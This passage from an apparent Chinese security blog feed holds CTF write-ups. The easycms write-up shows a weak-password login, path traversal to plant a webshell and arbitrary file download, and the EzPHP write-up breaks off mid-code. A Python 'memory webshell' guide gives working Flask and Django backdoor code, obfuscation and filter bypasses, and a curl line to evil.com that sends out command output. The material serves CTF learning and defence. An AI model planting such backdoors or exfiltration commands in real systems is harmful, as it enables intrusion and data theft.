        <content type="html"><![CDATA[<h1 id="GKCTF2021-easycms"><a href="#GKCTF2021-easycms" class="headerlink" title="GKCTF2021-easycms"></a>GKCTF2021-easycms</h1><p>题目提示后台密码5位弱口令，然后扫描后台扫出admin.php登录页面，然后直接弱口令登录</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">admin</span><br><span class="hljs-number">12345</span><br></code></pre></td></tr></table></figure><p>然后成功登录后台管理页面。</p><p>然后这题有两种解法</p><h2 id="解法1-getshell"><a href="#解法1-getshell" class="headerlink" title="解法1 getshell"></a>解法1 getshell</h2><p>进入 设计-&gt;高级，可以找到这里有一个控制主页面的可执行代码，如果我们改成木马就可以拿到shell了</p><p>显示请在服务器创建&#x2F;var&#x2F;www&#x2F;html&#x2F;system&#x2F;tmp&#x2F;qcke.txt文件。但是这里我们没有找到这个文件</p><p><img src="/../image/GKCTF2021-easycms-1.png"></p><p>但是在设计-&gt;组件-&gt;素材库中有可以上传文件的地方，我们上传一个txt文件</p><p><img src="/../image/GKCTF2021-easycms-2.png"></p><p>利用名称进行目录穿越<br>..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;system&#x2F;tmp&#x2F;qcke</p><p><img src="/../image/GKCTF2021-easycms-3.png"></p><p><img src="/../image/GKCTF2021-easycms-4.png"></p><p>然后再次尝试，保存成功</p><p><img src="/../image/GKCTF2021-easycms-5.png"></p><p>去到起始页面，发现所有布局全被改掉了，直接蚁剑连</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">3</span>e2feedb-<span class="hljs-number">7</span>a5b-<span class="hljs-number">4</span>cac-b2e6-<span class="hljs-number">6</span>f346228af2a.node5.buuoj.cn:<span class="hljs-number">81</span>/<br></code></pre></td></tr></table></figure><p>在根目录下找到flag</p><hr><h2 id="解法2-利用任意文件下载漏洞"><a href="#解法2-利用任意文件下载漏洞" class="headerlink" title="解法2 利用任意文件下载漏洞"></a>解法2 利用任意文件下载漏洞</h2><p>进入 设计→自定义→右上角导出主题→保存</p><p><img src="/../image/GKCTF2021-easycms-6.png"></p><p>然后会弹出一个下载，右键复制下载链接</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">3</span>e2feedb-<span class="hljs-number">7</span>a5b-<span class="hljs-number">4</span>cac-b2e6-<span class="hljs-number">6</span>f346228af2a.node5.buuoj.cn:<span class="hljs-number">81</span>/admin.php?m=ui&amp;f=downloadtheme&amp;theme=L3Zhci93d3cvaHRtbC9zeXN0ZW0vdG1wL3RoZW1lL2RlZmF1bHQvMS56aXA=<br></code></pre></td></tr></table></figure><p>看到最后一串很明显是base64编码，解码</p><p><img src="/../image/GKCTF2021-easycms-7.png"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>system<span class="hljs-regexp">/tmp/</span>theme<span class="hljs-regexp">/default/</span><span class="hljs-number">1</span>.zip<br></code></pre></td></tr></table></figure><p>解码后是文件的绝对路径</p><p>尝试改为&#x2F;flag得到flag</p><p>将&#x2F;flag base64编码一下</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">/flag<br><br><span class="hljs-attribute">L2ZsYWc</span><span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure><p>然后访问</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">3</span>e2feedb-<span class="hljs-number">7</span>a5b-<span class="hljs-number">4</span>cac-b2e6-<span class="hljs-number">6</span>f346228af2a.node5.buuoj.cn:<span class="hljs-number">81</span>/admin.php?m=ui&amp;f=downloadtheme&amp;theme=L2ZsYWc=<br></code></pre></td></tr></table></figure><p>就能将flag.zip下载下来，但是无法解压，用010editor打开，拿到flag</p><p><img src="/../image/GKCTF2021-easycms-8.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> getshell </tag>
            
            <tag> 弱口令密码 </tag>
            
            <tag> 任意文件下载 </tag>
            
            <tag> cms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二维码1</title>
      <link href="/2025/04/16/%E4%BA%8C%E7%BB%B4%E7%A0%811/"/>
      <url>/2025/04/16/%E4%BA%8C%E7%BB%B4%E7%A0%811/</url>
      
        <content type="html"><![CDATA[<h1 id="二维码1"><a href="#二维码1" class="headerlink" title="二维码1"></a>二维码1</h1><p>下载打开压缩包，是一个二维码</p><p><img src="/../image/%E4%BA%8C%E7%BB%B4%E7%A0%811-1.png"></p><p>然后用QR_Research扫一下二维码，得到secret is here</p><p><img src="/../image/%E4%BA%8C%E7%BB%B4%E7%A0%811-2.png"></p><p>用010editor打开，发现藏了个4number.txt文件</p><p><img src="/../image/%E4%BA%8C%E7%BB%B4%E7%A0%811-3.png"></p><p>拖入随波逐流，发现藏了个压缩包</p><p><img src="/../image/%E4%BA%8C%E7%BB%B4%E7%A0%811-4.png"></p><p>直接使用随波逐流工具binwalk分离，得到1D7.zip压缩包，但是打开压缩包要密码</p><p><img src="/../image/%E4%BA%8C%E7%BB%B4%E7%A0%811-5.png"></p><p>用ziperello工具暴力破解，通过4number文件名的提示可以猜测密码为4个数字，所以字符集选择数字，然后最小密码长度与最大密码长度调为4</p><p><img src="/../image/%E4%BA%8C%E7%BB%B4%E7%A0%811-6.png"></p><p>得到密码7639</p><p><img src="/../image/%E4%BA%8C%E7%BB%B4%E7%A0%811-7.png"></p><p>将4number.txt解压出来，然后打开得到flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">CTF</span><span class="hljs-template-variable">&#123;vjpw_wnoei&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">将CTF改为flag</span><br><span class="language-xml"></span><br><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;vjpw_wnoei&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 图片隐写 </tag>
            
            <tag> binwalk文件提取 </tag>
            
            <tag> ziperello工具暴力破解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python内存马</title>
      <link href="/2025/04/16/python%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2025/04/16/python%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h1 id="Python-内存马（内存-Webshell）技术详解"><a href="#Python-内存马（内存-Webshell）技术详解" class="headerlink" title="Python 内存马（内存 Webshell）技术详解"></a>Python 内存马（内存 Webshell）技术详解</h1><p><a href="https://xz.aliyun.com/news/16068?u_atoken=74c41920a00b8b254e2bcd921ea0fda6&u_asig=0a472f8317440258840025575e0034">pyramid  框架无回显挖掘 先知社区</a></p><p><a href="https://xz.aliyun.com/news/16464?time__1311=eqUxnDRD0QitIxWqGNcjDaAYD540INmhdx&u_atoken=a499ee16a29b0d3a2eedd30daf7c756c&u_asig=0a47309317440258746795862e00fe">强网杯 RS 加密签名伪造及 PyramidWeb 利用栈帧打内存马 先知社区</a></p><p><a href="https://xz.aliyun.com/news/16090?u_atoken=87dba66839b39d2b13eae6e4583416ca&u_asig=0a47309317440258787906072e00fe">对 pyramid 框架无回显的学习以一道 ctf 题目为例 先知社区</a></p><p>内存马（In-Memory Webshell）是一种无文件攻击技术，特别适用于Python Web应用。以下是Python环境下内存马的全面分析：</p><h2 id="一、Python内存马核心原理"><a href="#一、Python内存马核心原理" class="headerlink" title="一、Python内存马核心原理"></a>一、Python内存马核心原理</h2><p>Python内存马主要通过以下方式实现：</p><ol><li><strong>运行时代码注入</strong>：利用<code>exec</code>&#x2F;<code>eval</code>等函数动态执行代码</li><li><strong>框架Hook</strong>：修改Web框架的路由、视图或中间件</li><li><strong>全局拦截</strong>：劫持Python内置函数或模块</li></ol><h2 id="二、常见Python内存马实现方式"><a href="#二、常见Python内存马实现方式" class="headerlink" title="二、常见Python内存马实现方式"></a>二、常见Python内存马实现方式</h2><h3 id="1-路由型内存马（最常用）"><a href="#1-路由型内存马（最常用）" class="headerlink" title="1. 路由型内存马（最常用）"></a>1. 路由型内存马（最常用）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Flask示例</span><br><span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">from flask import request</span><br><span class="hljs-string">@app.route(&#x27;/_shell&#x27;)</span><br><span class="hljs-string">def shell():</span><br><span class="hljs-string">    import os</span><br><span class="hljs-string">    return os.popen(request.args.get(&#x27;cmd&#x27;)).read()</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br><br><span class="hljs-comment"># 访问方式：/_shell?cmd=whoami</span><br></code></pre></td></tr></table></figure><h3 id="2-中间件型内存马"><a href="#2-中间件型内存马" class="headerlink" title="2. 中间件型内存马"></a>2. 中间件型内存马</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Django示例</span><br><span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">from django.http import HttpResponse</span><br><span class="hljs-string">class MalwareMiddleware:</span><br><span class="hljs-string">    def __init__(self, get_response):</span><br><span class="hljs-string">        self.get_response = get_response</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    def __call__(self, request):</span><br><span class="hljs-string">        if request.path == &#x27;/_backdoor&#x27;:</span><br><span class="hljs-string">            import os, subprocess</span><br><span class="hljs-string">            cmd = request.GET.get(&#x27;c&#x27;, &#x27;whoami&#x27;)</span><br><span class="hljs-string">            return HttpResponse(subprocess.getoutput(cmd))</span><br><span class="hljs-string">        return self.get_response(request)</span><br><span class="hljs-string">    </span><br><span class="hljs-string"># 注入中间件</span><br><span class="hljs-string">import django.conf</span><br><span class="hljs-string">django.conf.settings.MIDDLEWARE.insert(0, &#x27;path.to.MalwareMiddleware&#x27;)</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="3-异常处理型内存马"><a href="#3-异常处理型内存马" class="headerlink" title="3. 异常处理型内存马"></a>3. 异常处理型内存马</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">import sys</span><br><span class="hljs-string">def exploit(type, value, tb):</span><br><span class="hljs-string">    if hasattr(value, &#x27;cmd&#x27;):</span><br><span class="hljs-string">        import os</span><br><span class="hljs-string">        return os.popen(value.cmd).read()</span><br><span class="hljs-string">sys.excepthook = exploit</span><br><span class="hljs-string"></span><br><span class="hljs-string"># 触发方式：raise type(&#x27;&#x27;, (), &#123;&#x27;cmd&#x27;: &#x27;whoami&#x27;&#125;)</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="三、高级隐蔽技术"><a href="#三、高级隐蔽技术" class="headerlink" title="三、高级隐蔽技术"></a>三、高级隐蔽技术</h2><h3 id="1-反射加载"><a href="#1-反射加载" class="headerlink" title="1. 反射加载"></a>1. 反射加载</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 通过字符串反射调用</span><br><span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>), <span class="hljs-string">&#x27;system&#x27;</span>)(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="2-编码混淆"><a href="#2-编码混淆" class="headerlink" title="2. 编码混淆"></a>2. 编码混淆</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Base64编码执行</span><br><span class="hljs-keyword">import</span> base64<br><span class="hljs-built_in">exec</span>(base64.b64decode(<span class="hljs-string">&#x27;cHJpbnQoIkhlbGxvIFdvcmxkISIp&#x27;</span>))<br></code></pre></td></tr></table></figure><h3 id="3-延迟加载"><a href="#3-延迟加载" class="headerlink" title="3. 延迟加载"></a>3. 延迟加载</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 使用__import__延迟加载</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">malicious</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;sleep 10&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="四、检测与防御方案"><a href="#四、检测与防御方案" class="headerlink" title="四、检测与防御方案"></a>四、检测与防御方案</h2><h3 id="检测方法："><a href="#检测方法：" class="headerlink" title="检测方法："></a>检测方法：</h3><ol><li><p><strong>运行时检查</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> inspect<br><span class="hljs-comment"># 检查所有路由</span><br><span class="hljs-built_in">print</span>(app.url_map)<br><span class="hljs-comment"># 检查已加载模块</span><br><span class="hljs-built_in">print</span>(sys.modules)<br></code></pre></td></tr></table></figure></li><li><p><strong>内存扫描工具</strong>：</p><ul><li>Pyrasite</li><li>Memhunter</li></ul></li></ol><h3 id="防御措施："><a href="#防御措施：" class="headerlink" title="防御措施："></a>防御措施：</h3><ol><li><p><strong>禁用危险函数</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">__builtins__.<span class="hljs-built_in">exec</span> = <span class="hljs-literal">None</span><br>__builtins__.<span class="hljs-built_in">eval</span> = <span class="hljs-literal">None</span><br></code></pre></td></tr></table></figure></li><li><p><strong>沙箱环境</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> restrictedpython <span class="hljs-keyword">import</span> compile_restricted<br></code></pre></td></tr></table></figure></li><li><p><strong>RASP防护</strong>：</p><ul><li>监控异常路由注册</li><li>拦截危险模块加载</li></ul></li></ol><h2 id="五、CTF实战技巧"><a href="#五、CTF实战技巧" class="headerlink" title="五、CTF实战技巧"></a>五、CTF实战技巧</h2><ol><li><p><strong>绕过过滤</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 字符串拼接</span><br><span class="hljs-string">&#x27;ex&#x27;</span>+<span class="hljs-string">&#x27;ec(&quot;import os; os.system(\&#x27;whoami\&#x27;)&quot;)&#x27;</span><br><br><span class="hljs-comment"># Unicode编码</span><br><span class="hljs-built_in">exec</span>(<span class="hljs-string">&#x27;\x69\x6d\x70\x6f\x72\x74\x20\x6f\x73&#x27;</span>)<br></code></pre></td></tr></table></figure></li><li><p><strong>无回显利用</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># DNS外带</span><br><span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;import os; os.system(&#x27;curl http://evil.com/`whoami`&#x27;)&quot;</span>)<br></code></pre></td></tr></table></figure></li><li><p><strong>持久化</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 修改.pyc文件</span><br><span class="hljs-keyword">import</span> py_compile<br>py_compile.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;malicious.py&#x27;</span>)<br></code></pre></td></tr></table></figure></li></ol><p>Python内存马因其灵活性成为高级攻击手段，理解其原理对攻防双方都至关重要。在CTF比赛中，这类题目通常考察代码审计、绕过技巧和内存操作能力。</p>]]></content>
      
      
      
        <tags>
            
            <tag> python内存马 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF2020-EzPHP</title>
      <link href="/2025/04/15/BJDCTF2020-EzPHP/"/>
      <url>/2025/04/15/BJDCTF2020-EzPHP/</url>
      
        <content type="html"><![CDATA[<h1 id="BJDCTF2020-EzPHP"><a href="#BJDCTF2020-EzPHP" class="headerlink" title="BJDCTF2020-EzPHP"></a>BJDCTF2020-EzPHP</h1><p>首先打开靶机，没发现什么信息，查看源码，发现提示</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- Here is the real page =w= --&gt;</span><br><span class="hljs-comment">&lt;!-- GFXEIM3YFZYGQ4A= --&gt;</span><br></code></pre></td></tr></table></figure><p>一个等号，推测是base32编码，解码之后发现新的php文件</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-number">1</span><span class="hljs-symbol">nD3</span>x.php<br></code></pre></td></tr></table></figure><p>访问1nD3x.php</p><p>源码：</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs coq">&lt;?php<br>highlight_file(__FILE__);<br>error_reporting(<span class="hljs-number">0</span>); <br><br>$file = <span class="hljs-string">&quot;1nD3x.php&quot;</span>;<br>$shana = $_GET[&#x27;shana&#x27;];<br>$passwd = $_GET[&#x27;passwd&#x27;];<br>$arg = &#x27;&#x27;;<br>$code = &#x27;&#x27;;<br><br>echo <span class="hljs-string">&quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;</span>;<br><br><span class="hljs-keyword">if</span>($_SERVER) &#123; <br>    <span class="hljs-keyword">if</span> (<br>        preg_match(&#x27;/shana|<span class="hljs-type">debu</span>|<span class="hljs-type">aqua</span>|<span class="hljs-type">cute</span>|<span class="hljs-type">arg</span>|<span class="hljs-type">code</span>|<span class="hljs-type">flag</span>|<span class="hljs-type">system</span>|<span class="hljs-type">exec</span>|<span class="hljs-type">passwd</span>|<span class="hljs-type">ass</span>|<span class="hljs-type">eval</span>|<span class="hljs-type">sort</span>|<span class="hljs-type">shell</span>|<span class="hljs-type">ob</span>|<span class="hljs-type">start</span>|<span class="hljs-type">mail</span>|<span class="hljs-type">\$|sou</span>|<span class="hljs-type">show</span>|<span class="hljs-type">cont</span>|<span class="hljs-type">high</span>|<span class="hljs-type">reverse</span>|<span class="hljs-type">flip</span>|<span class="hljs-type">rand</span>|<span class="hljs-type">scan</span>|<span class="hljs-type">chr</span>|<span class="hljs-type">local</span>|<span class="hljs-type">sess</span>|<span class="hljs-type">id</span>|<span class="hljs-type">source</span>|<span class="hljs-type">arra</span>|<span class="hljs-type">head</span>|<span class="hljs-type">light</span>|<span class="hljs-type">read</span>|<span class="hljs-type">inc</span>|<span class="hljs-type">info</span>|<span class="hljs-type">bin</span>|<span class="hljs-type">hex</span>|<span class="hljs-type">oct</span>|<span class="hljs-type">echo</span>|<span class="hljs-type">print</span>|<span class="hljs-type">pi</span>|<span class="hljs-type">\.|\&quot;|\&#x27;|log</span>/i&#x27;, $_SERVER[&#x27;QUERY_STRING&#x27;])<br>        )  <br>        die(&#x27;You seem to want to <span class="hljs-built_in">do</span> something bad?&#x27;); <br>&#125;<br><br><span class="hljs-keyword">if</span> (!preg_match(&#x27;/http|<span class="hljs-type">https</span>/i&#x27;, $_GET[&#x27;file&#x27;])) &#123;<br>    <span class="hljs-keyword">if</span> (preg_match(&#x27;/^aqua_is_cute$/&#x27;, $_GET[&#x27;debu&#x27;]) &amp;&amp; $_GET[&#x27;debu&#x27;] !== &#x27;aqua_is_cute&#x27;) &#123; <br>        $file = $_GET[<span class="hljs-string">&quot;file&quot;</span>]; <br>        echo <span class="hljs-string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;<br>    &#125; <br>&#125; <span class="hljs-keyword">else</span> die(&#x27;fxck you! What <span class="hljs-built_in">do</span> you want to <span class="hljs-built_in">do</span> ?!&#x27;);<br><br><span class="hljs-keyword">if</span>($_REQUEST) &#123; <br>    foreach($_REQUEST <span class="hljs-built_in">as</span> $value) &#123; <br>        <span class="hljs-keyword">if</span>(preg_match(&#x27;/[a-zA-Z]/i&#x27;, $value))  <br>            die(&#x27;fxck you! I hate English!&#x27;); <br>    &#125; <br>&#125; <br><br><span class="hljs-keyword">if</span> (file_get_contents($file) !== &#x27;debu_debu_aqua&#x27;)<br>    die(<span class="hljs-string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>);<br><br><br><span class="hljs-keyword">if</span> ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;<br>    extract($_GET[<span class="hljs-string">&quot;flag&quot;</span>]);<br>    echo <span class="hljs-string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span>&#123;<br>    die(<span class="hljs-string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(preg_match(&#x27;/^[a-z0<span class="hljs-number">-9</span>]*$/isD&#x27;, $code) |<span class="hljs-type">| </span><br><span class="hljs-type">preg_match</span>(&#x27;/fil|<span class="hljs-type">cat</span>|<span class="hljs-type">more</span>|<span class="hljs-type">tail</span>|<span class="hljs-type">tac</span>|<span class="hljs-type">less</span>|<span class="hljs-type">head</span>|<span class="hljs-type">nl</span>|<span class="hljs-type">tailf</span>|<span class="hljs-type">ass</span>|<span class="hljs-type">eval</span>|<span class="hljs-type">sort</span>|<span class="hljs-type">shell</span>|<span class="hljs-type">ob</span>|<span class="hljs-type">start</span>|<span class="hljs-type">mail</span>|<span class="hljs-type">\`|\&#123;|\%|x</span>|<span class="hljs-type">\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou</span>|<span class="hljs-type">show</span>|<span class="hljs-type">cont</span>|<span class="hljs-type">high</span>|<span class="hljs-type">reverse</span>|<span class="hljs-type">flip</span>|<span class="hljs-type">rand</span>|<span class="hljs-type">scan</span>|<span class="hljs-type">chr</span>|<span class="hljs-type">local</span>|<span class="hljs-type">sess</span>|<span class="hljs-type">id</span>|<span class="hljs-type">source</span>|<span class="hljs-type">arra</span>|<span class="hljs-type">head</span>|<span class="hljs-type">light</span>|<span class="hljs-type">print</span>|<span class="hljs-type">echo</span>|<span class="hljs-type">read</span>|<span class="hljs-type">inc</span>|<span class="hljs-type">flag</span>|<span class="hljs-type">1f</span>|<span class="hljs-type">info</span>|<span class="hljs-type">bin</span>|<span class="hljs-type">hex</span>|<span class="hljs-type">oct</span>|<span class="hljs-type">pi</span>|<span class="hljs-type">con</span>|<span class="hljs-type">rot</span>|<span class="hljs-type">input</span>|<span class="hljs-type">\.|log</span>|<span class="hljs-type">\^/i</span>&#x27;, $arg) ) &#123; <br>    die(<span class="hljs-string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); <br>&#125; <span class="hljs-keyword">else</span> &#123; <br>    include <span class="hljs-string">&quot;flag.php&quot;</span>;<br>    $code(&#x27;&#x27;, $arg); <br>&#125; ?&gt;<br>This is a very <span class="hljs-built_in">simple</span> challenge and <span class="hljs-keyword">if</span> you <span class="hljs-built_in">solve</span> it I will give you a flag. Good Luck!<br>Aqua is the cutest five-year-old child <span class="hljs-built_in">in</span> the world! Isn&#x27;t it ?<br></code></pre></td></tr></table></figure><hr><p>代码审计</p><h2 id="server-‘QUERY-STRING’"><a href="#server-‘QUERY-STRING’" class="headerlink" title="$_server[‘QUERY_STRING’]"></a>$_server[‘QUERY_STRING’]</h2><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">if($_SERVER) &#123; <br>    if (<br>  preg_match(&#x27;/shana|<span class="hljs-string">debu</span>|<span class="hljs-string">aqua</span>|<span class="hljs-string">cute</span>|<span class="hljs-string">arg</span>|<span class="hljs-string">code</span>|<span class="hljs-string">flag</span>|<span class="hljs-string">system</span>|<span class="hljs-string">exec</span>|<span class="hljs-string">passwd</span>|<span class="hljs-string">ass</span>|<span class="hljs-string">eval</span>|<span class="hljs-string">sort</span>|<span class="hljs-string">shell</span>|<span class="hljs-string">ob</span>|<span class="hljs-string">start</span>|<span class="hljs-string">mail</span>|<span class="hljs-string">\$</span>|<span class="hljs-string">sou</span>|<span class="hljs-string">show</span>|<span class="hljs-string">cont</span>|<span class="hljs-string">high</span>|<span class="hljs-string">reverse</span>|<span class="hljs-string">flip</span>|<span class="hljs-string">rand</span>|<span class="hljs-string">scan</span>|<span class="hljs-string">chr</span>|<span class="hljs-string">local</span>|<span class="hljs-string">sess</span>|<span class="hljs-string">id</span>|<span class="hljs-string">source</span>|<span class="hljs-string">arra</span>|<span class="hljs-string">head</span>|<span class="hljs-string">light</span>|<span class="hljs-string">read</span>|<span class="hljs-string">inc</span>|<span class="hljs-string">info</span>|<span class="hljs-string">bin</span>|<span class="hljs-string">hex</span>|<span class="hljs-string">oct</span>|<span class="hljs-string">echo</span>|<span class="hljs-string">print</span>|<span class="hljs-string">pi</span>|<span class="hljs-string">\.</span>|<span class="hljs-string">\&quot;</span>|<span class="hljs-string">\&#x27;</span>|<span class="hljs-string">log/i&#x27;, $_SERVER[&#x27;QUERY_STRING&#x27;])</span><br><span class="hljs-string">        )  </span><br><span class="hljs-string">        die(&#x27;You seem to want to do something bad?&#x27;); </span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure><p><strong>目的</strong>：判断url参数有无关键字</p><p><strong>特性</strong>：它不会对url编码进行解码。所以这里直接编码就可以绕过</p><p><strong>绕过：</strong>对payload进行url编码即可</p><h2 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match"></a>preg_match</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/http|https/i&#x27;</span>, <span 